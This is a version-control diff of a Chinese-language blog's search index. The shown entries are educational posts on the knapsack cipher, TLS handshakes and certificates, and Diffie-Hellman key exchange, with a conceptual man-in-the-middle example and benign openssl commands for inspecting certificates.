-
-
-<p>则公开序列为：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-A_i \equiv 17W_i \pmod{61}
-\]</div>
-
-</div>
-
-
-
-<p>即：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-A = (34, 51, 58, 55, 22)
-\]</div>
-
-</div>
-
-
-
-<p>若明文比特串为：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-X = (1,0,1,0,1)
-\]</div>
-
-</div>
-
-
-
-<p>则密文为：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-C = 34 + 58 + 22 = 114
-\]</div>
-
-</div>
-
-
-
-<p>解密时，先计算：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-r^{-1} \pmod{61} = 18
-\]</div>
-
-</div>
-
-
-
-<p>然后：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-C' \equiv 114 \cdot 18 \pmod{61} \equiv 39
-\]</div>
-
-</div>
-
-
-
-<p>注意到：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-39 = 2 + 7 + 30
-\]</div>
-
-</div>
-
-
-
-<p>因此对应的明文比特串正是 <span class="math-inline">(X &#x3D; (1,0,1,0,1))</span>。</p>
-<p>再用超递增序列 <span class="math-inline">(W)</span> 做贪心分解：</p>
-<ul>
-<li><span class="math-inline">(39 \ge 30)</span>，第 5 位为 1，剩余 <span class="math-inline">(9)</span></li>
-<li><span class="math-inline">(9 &lt; 14)</span>，第 4 位为 0</li>
-<li><span class="math-inline">(9 \ge 7)</span>，第 3 位为 1，剩余 <span class="math-inline">(2)</span></li>
-<li><span class="math-inline">(2 &lt; 3)</span>，第 2 位为 0</li>
-<li><span class="math-inline">(2 \ge 2)</span>，第 1 位为 1，剩余 <span class="math-inline">(0)</span></li>
-</ul>
-<p>由此恢复出原始比特串。</p>
-<p>这个例子中，公开序列和私钥序列之间的对应关系是严格一致的，因此加密和解密过程可以完整闭合。</p>
-<h2 id="8-安全性问题"><a href="#8-安全性问题" class="headerlink" title="8. 安全性问题"></a>8. 安全性问题</h2><p>背包密码体制曾经受到过较多研究，但后来发现许多早期方案存在明显缺陷，尤其是 Merkle-Hellman 方案。其主要问题包括：</p>
-<ul>
-<li>公开背包与私钥结构之间关系过于简单</li>
-<li>公开序列可能被格基方法分析</li>
-<li>某些参数选择下容易被还原出私钥结构</li>
-</ul>
-<p>因此，经典背包密码体制并没有像 RSA 那样长期成为主流公钥算法。</p>
-<h2 id="9-背包密码与格攻击"><a href="#9-背包密码与格攻击" class="headerlink" title="9. 背包密码与格攻击"></a>9. 背包密码与格攻击</h2><p>公开背包问题虽然表面上看像 NP 难问题，但如果参数设计不当，往往会暴露额外结构。例如：</p>
-<ul>
-<li>序列具有近似超递增特征</li>
-<li>模数和乘数选择不理想</li>
-<li>公开向量之间存在可利用关系</li>
-</ul>
-<p>这类结构可以被格方法利用，从而恢复原始私钥或明文。</p>
-<h2 id="10-总结"><a href="#10-总结" class="headerlink" title="10. 总结"></a>10. 总结</h2><p>背包密码体制的核心思路是将明文编码为若干二进制系数，再通过权重求和形成密文。它的关键点在于：</p>
-<ul>
-<li>一般背包问题求解困难</li>
-<li>超递增序列可以高效解密</li>
-<li>公钥方案需要对私钥结构进行隐藏</li>
-<li>经典方案存在较明显的安全缺陷</li>
-</ul>
-<p>因此，背包密码体制更适合作为密码学发展史中的重要实例来理解，而不是现代主流加密方案。</p>
-]]></content>
-      <categories>
-        <category>密码学</category>
-      </categories>
-      <tags>
-        <tag>密码学</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Diffie-Hellman</title>
-    <url>/2026/03/16/Diffie-Hellman/</url>
-    <content><![CDATA[<h1 id="Diffie-Hellman"><a href="#Diffie-Hellman" class="headerlink" title="Diffie-Hellman"></a>Diffie-Hellman</h1><p><strong>迪菲-赫尔曼密钥交换</strong>（英语：Diffie–Hellman key exchange，缩写为D-H） 是一种安全协议。它可以让双方在完全没有对方任何预先信息的条件下通过不安全信道建立起一个密钥。这个密钥可以在后续的通讯中作为对称密钥来加密通讯内容。公钥交换的概念最早由瑞夫·墨克（Ralph C. Merkle）提出，而这个密钥交换方法，由惠特菲尔德·迪菲（Bailey Whitfield Diffie）和马丁·赫尔曼（Martin Edward Hellman）在1976年首次发表。马丁·赫尔曼曾主张这个密钥交换方法，应被称为迪菲-赫尔曼-墨克密钥交换（英语：Diffie–Hellman–Merkle key exchange）</p>
+    <title>TLS</title>
+    <url>/2026/03/23/TLS/</url>
+    <content><![CDATA[<h1 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h1><p>TLS（Transport Layer Security）是现在 HTTPS 背后的核心协议。它解决的问题很直接：在一个不可信的网络里，客户端和服务器如何确认对方身份，并协商出后续通信要用的密钥。</p>
+<p>TLS 本身不是某一种加密算法，而是把证书、密钥交换、对称加密、哈希和消息认证组合在一起的一套协议。</p>
 <span id="more"></span>
 
-<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Diffie–Hellman（简称 <strong>DH</strong>）是一种经典的<strong>密钥交换协议</strong>，由 Whitfield Diffie 和 Martin Hellman 于 1976 年提出。它的核心目标不是直接加密消息，而是让两个此前并不共享秘密信息的通信方，能够在<strong>公开信道</strong>上协商出一个只有双方知道的<strong>共享密钥</strong>。</p>
-<p>这件事听起来有些反直觉：通信内容和计算过程都可能被别人看到，为什么攻击者却无法得到最终的密钥？Diffie–Hellman 的巧妙之处就在于，它利用了数论中的一个难题——<strong>离散对数问题</strong>。在适当选择参数的前提下，攻击者虽然能看到公开交换的数据，但想从这些公开信息反推出双方的私有秘密，在计算上是极其困难的。</p>
-<h2 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h2><p>迪菲－赫尔曼通过公共信道交换一个信息，就可以建立一个可以用于在公共信道上安全通信的共享秘密</p>
-<p>以下解释它的过程（包括算法的数学部分）：</p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>HTTP 本身是明文的，如果直接传输登录密码、Cookie 或接口数据，中间人只要能抓包就能看到内容。HTTPS 可以理解为：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+\text{HTTPS} = \text{HTTP} + \text{TLS}
+\]</div>
+
+</div>
+
+
+
+<p>也就是说，HTTP 负责应用层语义，TLS 负责在传输前先建立一条安全信道。</p>
+<p>TLS 主要保证三件事：</p>
+<ul>
+<li><strong>机密性</strong>：别人抓到流量也看不懂内容</li>
+<li><strong>完整性</strong>：传输过程中数据不能被随便篡改</li>
+<li><strong>身份认证</strong>：客户端能确认自己连到的确实是目标服务器</li>
+</ul>
+<p>从整体上看，TLS 的过程可以分成两段：</p>
 <ol>
-<li><p>Alice 和 Bob 先协商一个大素数 <strong>p</strong>，并在模 p的乘法群 <strong>G</strong> 中选择一个生成元 <strong>g</strong>。(其中，<strong>p</strong> 和 <strong>g</strong> 都是公开的，攻击者也可以看到。注意，对于给定的群 G，可能存在多个生成元，Alice 和 Bob 只需选定其中一个即可)</p>
-</li>
-<li><p>Alice 选择一个随机自然数 <strong>a</strong> 作为私钥，计算</p>
-</li>
+<li>握手阶段：认证身份，协商密钥</li>
+<li>传输阶段：用会话密钥加密通信数据</li>
 </ol>
-<div class="math-display">
-
-<div class="math-display">\[
-A = g^a \bmod p
-\]</div>
-
-</div>
-
-
-<p>   并将 A 发送给 Bob。</p>
-<ol start="3">
-<li>Bob 选择一个随机自然数 <strong>b</strong> 作为私钥，计算</li>
+<p>前者主要依赖非对称密码学，后者主要依赖对称加密。</p>
+<p><img src="/images/symmetric%20vs%20asymmetric%20encryption%20diagram.png" alt="symmetric-vs-asymmetric"></p>
+<h2 id="握手流程"><a href="#握手流程" class="headerlink" title="握手流程"></a>握手流程</h2><p>TLS 握手的目标是让客户端和服务器在公开网络上得到同一个会话密钥。攻击者可以看到双方发出的报文，但不能推出最终密钥。</p>
+<p>一个简化流程如下：</p>
+<ol>
+<li>客户端发送 <code>ClientHello</code></li>
+<li>服务器返回 <code>ServerHello</code> 和证书</li>
+<li>客户端验证证书</li>
+<li>双方完成密钥交换</li>
+<li>双方派生会话密钥</li>
+<li>后续数据开始加密传输</li>
 </ol>
+<p><img src="/images/TLS.png" alt="TLS"></p>
+<h3 id="ClientHello"><a href="#ClientHello" class="headerlink" title="ClientHello"></a>ClientHello</h3><p>客户端先发一个 <code>ClientHello</code>，里面会带上：</p>
+<ul>
+<li>支持的 TLS 版本</li>
+<li>支持的密码套件</li>
+<li>随机数 <code>ClientRandom</code></li>
+<li>扩展字段，例如 SNI、ALPN、支持的椭圆曲线等</li>
+</ul>
+<p>它的作用可以理解为客户端告诉服务器：</p>
+<blockquote>
+<p>我支持这些算法和参数，你从里面选一套。</p>
+</blockquote>
+<h3 id="ServerHello"><a href="#ServerHello" class="headerlink" title="ServerHello"></a>ServerHello</h3><p>服务器收到后返回 <code>ServerHello</code>，主要包括：</p>
+<ul>
+<li>选择的 TLS 版本</li>
+<li>选择的密码套件</li>
+<li>随机数 <code>ServerRandom</code></li>
+<li>服务器证书</li>
+<li>密钥交换需要的参数</li>
+</ul>
+<p>这里最重要的是证书和密钥交换参数。证书用来证明服务器身份，密钥交换参数用来生成后续共享秘密。</p>
+<h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>如果没有证书，客户端并不知道自己连到的是不是真服务器。攻击者完全可以伪造一个服务器，截获客户端请求。</p>
+<p>证书的作用就是把域名和公钥绑定起来，并由 CA 做背书。</p>
+<p>客户端验证证书时通常会检查：</p>
+<ul>
+<li>证书是否过期</li>
+<li>域名是否匹配</li>
+<li>证书链是否能追溯到可信根证书</li>
+<li>证书是否被吊销</li>
+</ul>
+<p><img src="/images/certificate%20chain1.png" alt="certificate-chain"></p>
+<p>可以把证书链理解为：</p>
 <div class="math-display">
 
 <div class="math-display">\[
-B = g^b \bmod p
+\text{服务器证书} \rightarrow \text{中间 CA} \rightarrow \text{根 CA}
 \]</div>
 
 </div>
 
 
-<p>   并将 B 发送给 Alice。</p>
-<ol start="4">
-<li>Alice 收到B 后，计算</li>
-</ol>
+
+<p>只要这条链能接到本地信任的根证书，客户端就可以相信这个服务器公钥确实属于目标域名。</p>
+<h2 id="密钥交换"><a href="#密钥交换" class="headerlink" title="密钥交换"></a>密钥交换</h2><p>TLS 握手中最关键的一步是密钥交换。它要解决的问题是：双方如何在不安全网络里得到同一个秘密值。</p>
+<p>以 Diffie-Hellman 思想来看，双方最终会得到：</p>
 <div class="math-display">
 
 <div class="math-display">\[
-K = B^a \bmod p = (g^b)^a \bmod p
+K = g^{ab} \mod p
 \]</div>
 
 </div>
 
 
 
-<ol start="5">
-<li>Bob 收到 A 后，计算</li>
-</ol>
-<div class="math-display">
-
-<div class="math-display">\[
-K = A^b \bmod p = (g^a)^b \bmod p
-\]</div>
-
-</div>
-
-
-
-<p>于是，Alice 和 Bob 都得到了同一个共享秘密：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-K = g^{ab} \bmod p = g^{ba} \bmod p
-\]</div>
-
-</div>
-
-
-<p>它可以进一步经过哈希处理，导出真正用于对称加密通信的密钥。</p>
+<p>其中客户端掌握 <span class="math-inline">(a)</span>，服务器掌握 <span class="math-inline">(b)</span>。攻击者能看到公开参数和交换值，但要从中推出 <span class="math-inline">(K)</span>，本质上要解决离散对数相关问题。</p>
 <p><img src="/images/DiffieHellman.png" alt="Diffie-Hellman"></p>
-<h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><p>在选择了合适的<em>G</em>和<em>g</em>时，这个协议被认为是窃听安全的。偷听者伊芙可能必须通过求解迪菲－赫尔曼问题来得到<em>g^ab</em>。在当前，这被认为是一个困难问题。如果出现了一个高效的解决离散对数问题的算法，那么可以用它来简化<em>a</em>或者<em>b</em>的计算，那么也就可以用来解决迪菲－赫尔曼问题，使得包括本系统在内的很多公钥密码学系统变得不安全。</p>
-<p><em>G</em>的阶应当是一个素数，或者它有一个足够大的素因子以防止使用Pohlig–Hellman算法来得到<em>a</em>或者<em>b</em>。由于这个原因，一个<strong>索菲热尔曼素数</strong>q<em>可以用来计算素数</em>p&#x3D;2q+1*，这样的<em>p</em>称为安全素数，因为使用它之后<em>G</em>的阶只能被2和<em>q</em>整除。<em>g</em>有时被选择成<em>G</em>的<em>q</em>阶子群的生成元，而不是<em>G</em>本身的生成元，这样<em>g^a</em>的勒让德符号)将不会显示出*a的低位。</p>
-<p>如果Alice和Bob使用的随机数生成器不能做到完全随机并且从某种程度上讲是可预测的，那么Eve的工作将简单的多。</p>
-<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>中间人攻击（英语：Man-in-the-middle attack，缩写：MITM）在密码学和计算机安全领域中是指攻击者与通讯的两端分别建立独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。</p>
-<p>在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。在许多情况下这是很简单的（例如，在一个未加密的Wi-Fi 无线接入点的接受范围内的中间人攻击者，可以将自己作为一个中间人插入这个网络）。</p>
-<p>一个中间人攻击能成功的前提条件是攻击者能将自己伪装成每一个参与会话的终端，并且不被其他终端识破。中间人攻击是一个（缺乏）相互认证的攻击。大多数的加密协议都专门加入了一些特殊的认证方法以阻止中间人攻击。例如，SSL协议可以验证参与通讯的一方或双方使用的证书是否是由权威的受信任的数字证书认证机构颁发，并且能执行双向身份认证。</p>
-<h3 id="攻击示例"><a href="#攻击示例" class="headerlink" title="攻击示例"></a>攻击示例</h3><p>1.<strong>Alice</strong> 发送给 <strong>Bob</strong> 一条消息，却被 <strong>Mallory</strong> 截获：</p>
-<blockquote>
-<p><strong>Alice</strong>  “嗨，Bob，我是Alice。给我你的公钥” → <strong>Mallory</strong> <strong>Bob</strong></p>
-</blockquote>
-<p>2.<strong>Mallory</strong> 将这条截获的消息转送给 <strong>Bob</strong>；此时 <strong>Bob</strong> 并无法分辨这条消息是否从真的 <strong>Alice</strong> 那里发来的：</p>
-<blockquote>
-<p><strong>Alice</strong> <strong>Mallory</strong>     “嗨，Bob，我是Alice。给我你的公钥” → <strong>Bob</strong></p>
-</blockquote>
-<p>3.<strong>Bob</strong> 回应 <strong>Alice</strong> 的消息，并附上了他的公钥：</p>
-<blockquote>
-<p><strong>Alice</strong> <strong>Mallory</strong> ← <em>[Bob 的公钥]</em> — <strong>Bob</strong></p>
-</blockquote>
-<p>4.<strong>Mallory</strong> 用自己的密钥替换了消息中 <strong>Bob</strong> 的密钥，并将消息转发给 <strong>Alice</strong>，声称这是 <strong>Bob</strong> 的公钥：</p>
-<blockquote>
-<p><strong>Alice</strong> ← <em>[Mallory 的公钥]</em> — <strong>Mallory</strong> <strong>Bob</strong></p>
-</blockquote>
-<p>5.<strong>Alice</strong> 用她以为是 <strong>Bob</strong> 的公钥加密了她的消息，以为只有 <strong>Bob</strong> 才能读到它：</p>
-<blockquote>
-<p><strong>Alice</strong>   “我们在公共汽车站见面！”— [使用 Mallory 的公钥加密] → <strong>Mallory</strong> <strong>Bob</strong></p>
-</blockquote>
-<p>6.然而，由于这个消息实际上是用 <strong>Mallory</strong> 的密钥加密的，所以 <strong>Mallory</strong> 可以解密它，阅读它，并在愿意的时候修改它。她使用 <strong>Bob</strong> 的密钥重新加密，并将重新加密后的消息转发给 <strong>Bob</strong>：</p>
-<blockquote>
-<p><strong>Alice</strong> <strong>Mallory</strong>   “在家等我！”— [使用 Bob 的公钥加密] → <strong>Bob</strong></p>
-</blockquote>
-<p>7.<strong>Bob</strong> 认为，这条消息是经由安全的传输通道从 <strong>Alice</strong> 那里传来的。</p>
+<p>现代 TLS 中更常见的是 ECDHE，也就是椭圆曲线上的临时 Diffie-Hellman 密钥交换。它的好处是可以提供<strong>前向安全性</strong>。</p>
+<p>所谓前向安全性，就是即使服务器长期私钥以后泄露，之前抓到的历史流量也不容易被解密。</p>
+<p>原因在于每次会话都会生成临时密钥。长期私钥主要用于认证，不直接决定历史会话密钥。</p>
+<h2 id="会话密钥"><a href="#会话密钥" class="headerlink" title="会话密钥"></a>会话密钥</h2><p>密钥交换得到的共享秘密不会直接拿来加密数据，而是会经过 KDF 派生出多组密钥。</p>
+<p>这些密钥通常包括：</p>
+<ul>
+<li>客户端写入密钥</li>
+<li>服务器写入密钥</li>
+<li>初始化向量 IV</li>
+<li>认证相关密钥</li>
+</ul>
+<p>可以简单写成：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+\text{traffic keys} = \mathrm{KDF}(\text{shared secret}, \text{handshake context})
+\]</div>
+
+</div>
+
+
+
+<p>这里的 <code>handshake context</code> 包含握手过程中的随机数、协商参数和握手摘要等信息。</p>
+<p>也就是说，会话密钥不是孤立生成的，而是和本次握手过程绑定在一起。</p>
+<h2 id="记录协议"><a href="#记录协议" class="headerlink" title="记录协议"></a>记录协议</h2><p>握手完成之后，应用层数据不会直接发出去，而是交给 TLS Record 层处理。</p>
+<p>大致流程如下：</p>
+<ol>
+<li>将数据切分为记录</li>
+<li>对记录进行加密</li>
+<li>加上完整性校验</li>
+<li>发送给对方</li>
+</ol>
+<p>现代 TLS 常用 AEAD 算法，例如：</p>
+<ul>
+<li>AES-GCM</li>
+<li>ChaCha20-Poly1305</li>
+</ul>
+<p>AEAD 的特点是同时提供加密和认证。也就是说，它既保证内容不可读，也能发现数据是否被篡改。</p>
+<h2 id="TLS-1-2-和-TLS-1-3"><a href="#TLS-1-2-和-TLS-1-3" class="headerlink" title="TLS 1.2 和 TLS 1.3"></a>TLS 1.2 和 TLS 1.3</h2><p>TLS 1.3 相比 TLS 1.2 做了很多减法。</p>
+<p><img src="/images/TLS1.3vsTLS1.2.png" alt="TLS1.3-vs-TLS1.2"></p>
+<p>主要区别包括：</p>
+<ul>
+<li>握手轮次更少</li>
+<li>删除 RSA 密钥交换</li>
+<li>删除 CBC 等旧算法</li>
+<li>默认使用前向安全的密钥交换</li>
+<li>握手阶段更多内容被加密保护</li>
+</ul>
+<p>TLS 1.2 仍然支持很多历史算法，因此兼容性更强，但协议复杂度也更高。TLS 1.3 则更像一次清理：把容易出问题的旧东西去掉，只保留更现代的方案。</p>
+<h2 id="OpenSSL-查看证书"><a href="#OpenSSL-查看证书" class="headerlink" title="OpenSSL 查看证书"></a>OpenSSL 查看证书</h2><p>可以用下面命令查看一个网站的证书和握手信息：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl s_client -connect example.com:443 -servername example.com</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>-connect</code> 指定连接地址，<code>-servername</code> 用来发送 SNI。现在很多服务器会根据 SNI 返回不同证书，所以一般要带上。</p>
+<p>如果只想看证书链，可以这样：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl s_client -connect example.com:443 -servername example.com -showcerts</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>密码学</category>
@@ -3660,160 +2819,1233 @@ f(x)=A+x
       </tags>
   </entry>
   <entry>
-    <title>TLS</title>
-    <url>/2026/03/23/TLS/</url>
-    <content><![CDATA[<h1 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h1><p>TLS（Transport Layer Security）是现在 HTTPS 背后的核心协议。它解决的问题很直接：在一个不可信的网络里，客户端和服务器如何确认对方身份，并协商出后续通信要用的密钥。</p>
-<p>TLS 本身不是某一种加密算法，而是把证书、密钥交换、对称加密、哈希和消息认证组合在一起的一套协议。</p>
+    <title>Diffie-Hellman</title>
+    <url>/2026/03/16/Diffie-Hellman/</url>
+    <content><![CDATA[<h1 id="Diffie-Hellman"><a href="#Diffie-Hellman" class="headerlink" title="Diffie-Hellman"></a>Diffie-Hellman</h1><p><strong>迪菲-赫尔曼密钥交换</strong>（英语：Diffie–Hellman key exchange，缩写为D-H） 是一种安全协议。它可以让双方在完全没有对方任何预先信息的条件下通过不安全信道建立起一个密钥。这个密钥可以在后续的通讯中作为对称密钥来加密通讯内容。公钥交换的概念最早由瑞夫·墨克（Ralph C. Merkle）提出，而这个密钥交换方法，由惠特菲尔德·迪菲（Bailey Whitfield Diffie）和马丁·赫尔曼（Martin Edward Hellman）在1976年首次发表。马丁·赫尔曼曾主张这个密钥交换方法，应被称为迪菲-赫尔曼-墨克密钥交换（英语：Diffie–Hellman–Merkle key exchange）</p>
 <span id="more"></span>
 
-<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>HTTP 本身是明文的，如果直接传输登录密码、Cookie 或接口数据，中间人只要能抓包就能看到内容。HTTPS 可以理解为：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-\text{HTTPS} = \text{HTTP} + \text{TLS}
-\]</div>
-
-</div>
-
-
-
-<p>也就是说，HTTP 负责应用层语义，TLS 负责在传输前先建立一条安全信道。</p>
-<p>TLS 主要保证三件事：</p>
-<ul>
-<li><strong>机密性</strong>：别人抓到流量也看不懂内容</li>
-<li><strong>完整性</strong>：传输过程中数据不能被随便篡改</li>
-<li><strong>身份认证</strong>：客户端能确认自己连到的确实是目标服务器</li>
-</ul>
-<p>从整体上看，TLS 的过程可以分成两段：</p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Diffie–Hellman（简称 <strong>DH</strong>）是一种经典的<strong>密钥交换协议</strong>，由 Whitfield Diffie 和 Martin Hellman 于 1976 年提出。它的核心目标不是直接加密消息，而是让两个此前并不共享秘密信息的通信方，能够在<strong>公开信道</strong>上协商出一个只有双方知道的<strong>共享密钥</strong>。</p>
+<p>这件事听起来有些反直觉：通信内容和计算过程都可能被别人看到，为什么攻击者却无法得到最终的密钥？Diffie–Hellman 的巧妙之处就在于，它利用了数论中的一个难题——<strong>离散对数问题</strong>。在适当选择参数的前提下，攻击者虽然能看到公开交换的数据，但想从这些公开信息反推出双方的私有秘密，在计算上是极其困难的。</p>
+<h2 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h2><p>迪菲－赫尔曼通过公共信道交换一个信息，就可以建立一个可以用于在公共信道上安全通信的共享秘密</p>
+<p>以下解释它的过程（包括算法的数学部分）：</p>
 <ol>
-<li>握手阶段：认证身份，协商密钥</li>
-<li>传输阶段：用会话密钥加密通信数据</li>
+<li><p>Alice 和 Bob 先协商一个大素数 <strong>p</strong>，并在模 p的乘法群 <strong>G</strong> 中选择一个生成元 <strong>g</strong>。(其中，<strong>p</strong> 和 <strong>g</strong> 都是公开的，攻击者也可以看到。注意，对于给定的群 G，可能存在多个生成元，Alice 和 Bob 只需选定其中一个即可)</p>
+</li>
+<li><p>Alice 选择一个随机自然数 <strong>a</strong> 作为私钥，计算</p>
+</li>
 </ol>
-<p>前者主要依赖非对称密码学，后者主要依赖对称加密。</p>
-<p><img src="/images/symmetric%20vs%20asymmetric%20encryption%20diagram.png" alt="symmetric-vs-asymmetric"></p>
-<h2 id="握手流程"><a href="#握手流程" class="headerlink" title="握手流程"></a>握手流程</h2><p>TLS 握手的目标是让客户端和服务器在公开网络上得到同一个会话密钥。攻击者可以看到双方发出的报文，但不能推出最终密钥。</p>
-<p>一个简化流程如下：</p>
-<ol>
-<li>客户端发送 <code>ClientHello</code></li>
-<li>服务器返回 <code>ServerHello</code> 和证书</li>
-<li>客户端验证证书</li>
-<li>双方完成密钥交换</li>
-<li>双方派生会话密钥</li>
-<li>后续数据开始加密传输</li>
-</ol>
-<p><img src="/images/TLS.png" alt="TLS"></p>
-<h3 id="ClientHello"><a href="#ClientHello" class="headerlink" title="ClientHello"></a>ClientHello</h3><p>客户端先发一个 <code>ClientHello</code>，里面会带上：</p>
-<ul>
-<li>支持的 TLS 版本</li>
-<li>支持的密码套件</li>
-<li>随机数 <code>ClientRandom</code></li>
-<li>扩展字段，例如 SNI、ALPN、支持的椭圆曲线等</li>
-</ul>
-<p>它的作用可以理解为客户端告诉服务器：</p>
-<blockquote>
-<p>我支持这些算法和参数，你从里面选一套。</p>
-</blockquote>
-<h3 id="ServerHello"><a href="#ServerHello" class="headerlink" title="ServerHello"></a>ServerHello</h3><p>服务器收到后返回 <code>ServerHello</code>，主要包括：</p>
-<ul>
-<li>选择的 TLS 版本</li>
-<li>选择的密码套件</li>
-<li>随机数 <code>ServerRandom</code></li>
-<li>服务器证书</li>
-<li>密钥交换需要的参数</li>
-</ul>
-<p>这里最重要的是证书和密钥交换参数。证书用来证明服务器身份，密钥交换参数用来生成后续共享秘密。</p>
-<h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>如果没有证书，客户端并不知道自己连到的是不是真服务器。攻击者完全可以伪造一个服务器，截获客户端请求。</p>
-<p>证书的作用就是把域名和公钥绑定起来，并由 CA 做背书。</p>
-<p>客户端验证证书时通常会检查：</p>
-<ul>
-<li>证书是否过期</li>
-<li>域名是否匹配</li>
-<li>证书链是否能追溯到可信根证书</li>
-<li>证书是否被吊销</li>
-</ul>
-<p><img src="/images/certificate%20chain1.png" alt="certificate-chain"></p>
-<p>可以把证书链理解为：</p>
 <div class="math-display">
 
 <div class="math-display">\[
-\text{服务器证书} \rightarrow \text{中间 CA} \rightarrow \text{根 CA}
+A = g^a \bmod p
+\]</div>
+
+</div>
+
+
+<p>   并将 A 发送给 Bob。</p>
+<ol start="3">
+<li>Bob 选择一个随机自然数 <strong>b</strong> 作为私钥，计算</li>
+</ol>
+<div class="math-display">
+
+<div class="math-display">\[
+B = g^b \bmod p
+\]</div>
+
+</div>
+
+
+<p>   并将 B 发送给 Alice。</p>
+<ol start="4">
+<li>Alice 收到B 后，计算</li>
+</ol>
+<div class="math-display">
+
+<div class="math-display">\[
+K = B^a \bmod p = (g^b)^a \bmod p
 \]</div>
 
 </div>
 
 
 
-<p>只要这条链能接到本地信任的根证书，客户端就可以相信这个服务器公钥确实属于目标域名。</p>
-<h2 id="密钥交换"><a href="#密钥交换" class="headerlink" title="密钥交换"></a>密钥交换</h2><p>TLS 握手中最关键的一步是密钥交换。它要解决的问题是：双方如何在不安全网络里得到同一个秘密值。</p>
-<p>以 Diffie-Hellman 思想来看，双方最终会得到：</p>
+<ol start="5">
+<li>Bob 收到 A 后，计算</li>
+</ol>
 <div class="math-display">
 
 <div class="math-display">\[
-K = g^{ab} \mod p
+K = A^b \bmod p = (g^a)^b \bmod p
 \]</div>
 
 </div>
 
 
 
-<p>其中客户端掌握 <span class="math-inline">(a)</span>，服务器掌握 <span class="math-inline">(b)</span>。攻击者能看到公开参数和交换值，但要从中推出 <span class="math-inline">(K)</span>，本质上要解决离散对数相关问题。</p>
+<p>于是，Alice 和 Bob 都得到了同一个共享秘密：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+K = g^{ab} \bmod p = g^{ba} \bmod p
+\]</div>
+
+</div>
+
+
+<p>它可以进一步经过哈希处理，导出真正用于对称加密通信的密钥。</p>
 <p><img src="/images/DiffieHellman.png" alt="Diffie-Hellman"></p>
-<p>现代 TLS 中更常见的是 ECDHE，也就是椭圆曲线上的临时 Diffie-Hellman 密钥交换。它的好处是可以提供<strong>前向安全性</strong>。</p>
-<p>所谓前向安全性，就是即使服务器长期私钥以后泄露，之前抓到的历史流量也不容易被解密。</p>
-<p>原因在于每次会话都会生成临时密钥。长期私钥主要用于认证，不直接决定历史会话密钥。</p>
-<h2 id="会话密钥"><a href="#会话密钥" class="headerlink" title="会话密钥"></a>会话密钥</h2><p>密钥交换得到的共享秘密不会直接拿来加密数据，而是会经过 KDF 派生出多组密钥。</p>
-<p>这些密钥通常包括：</p>
-<ul>
-<li>客户端写入密钥</li>
-<li>服务器写入密钥</li>
-<li>初始化向量 IV</li>
-<li>认证相关密钥</li>
-</ul>
-<p>可以简单写成：</p>
+<h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><p>在选择了合适的<em>G</em>和<em>g</em>时，这个协议被认为是窃听安全的。偷听者伊芙可能必须通过求解迪菲－赫尔曼问题来得到<em>g^ab</em>。在当前，这被认为是一个困难问题。如果出现了一个高效的解决离散对数问题的算法，那么可以用它来简化<em>a</em>或者<em>b</em>的计算，那么也就可以用来解决迪菲－赫尔曼问题，使得包括本系统在内的很多公钥密码学系统变得不安全。</p>
+<p><em>G</em>的阶应当是一个素数，或者它有一个足够大的素因子以防止使用Pohlig–Hellman算法来得到<em>a</em>或者<em>b</em>。由于这个原因，一个<strong>索菲热尔曼素数</strong>q<em>可以用来计算素数</em>p&#x3D;2q+1*，这样的<em>p</em>称为安全素数，因为使用它之后<em>G</em>的阶只能被2和<em>q</em>整除。<em>g</em>有时被选择成<em>G</em>的<em>q</em>阶子群的生成元，而不是<em>G</em>本身的生成元，这样<em>g^a</em>的勒让德符号)将不会显示出*a的低位。</p>
+<p>如果Alice和Bob使用的随机数生成器不能做到完全随机并且从某种程度上讲是可预测的，那么Eve的工作将简单的多。</p>
+<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>中间人攻击（英语：Man-in-the-middle attack，缩写：MITM）在密码学和计算机安全领域中是指攻击者与通讯的两端分别建立独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。</p>
+<p>在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。在许多情况下这是很简单的（例如，在一个未加密的Wi-Fi 无线接入点的接受范围内的中间人攻击者，可以将自己作为一个中间人插入这个网络）。</p>
